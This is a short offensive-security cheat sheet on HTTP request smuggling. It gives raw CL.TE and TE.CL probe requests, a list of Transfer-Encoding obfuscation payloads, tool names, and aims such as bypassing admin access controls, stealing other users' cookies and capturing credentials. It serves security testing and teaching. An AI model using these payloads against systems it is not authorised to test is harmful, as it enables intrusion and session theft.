# HTTP Request Smuggling

Two servers disagree about where a request ends. The bytes after the boundary become the
prefix of the next request.

---

## The disagreements

| Front-end uses | Back-end uses | Attack |
|---|---|---|
| `Content-Length` | `Transfer-Encoding` | CL.TE |
| `Transfer-Encoding` | `Content-Length` | TE.CL |
| `TE: chunked` | `TE: chunked` with obfuscation | TE.TE |
| `TE: chunked` | `TE: xchunked` | TE.TE |
| — | HTTP/2 downgrade | H2.CL / H2.TE |

---

## Detection

CL.TE:

```
POST / HTTP/1.1
Host: t
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

TE.CL:

```
POST / HTTP/1.1
Host: t
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

A timeout or a 400 on the second request indicates the desync.

---

## TE obfuscation set

```
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding:\tchunked
X: X\nTransfer-Encoding: chunked
Transfer-Encoding: CHUNKED
```

---

## Exploitation shapes

- **Bypass front-end ACL**: smuggle a request to `/admin` past the edge.
- **Poison the next user's request**: capture their cookie in a stored response.
- **Cache poisoning**: the smuggled response is cached.
- **Credential capture**: smuggle a request that makes the victim's request land in your
  account.

---

## Tools

`smuggler.py`, `http2smugl`, Burp's "HTTP Request Smuggler" extension. Always confirm
manually with the raw timing probe — automated tools produce false positives on
keep-alive quirks.

---

## HTTP/2 downgrade

`H2.CL`: send `content-length` in an HTTP/2 request that disagrees with the `:path`
body. The front-end converts to HTTP/1.1 and passes both.

---

## Go deeper

1. Test with `Connection: keep-alive` and `Connection: close` separately.
2. Test whether the front-end reuses the back-end connection.
3. Test the smuggled request against a static file (cheap, no auth).
4. Test on the API host — desync there poisons tokens, not just pages.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
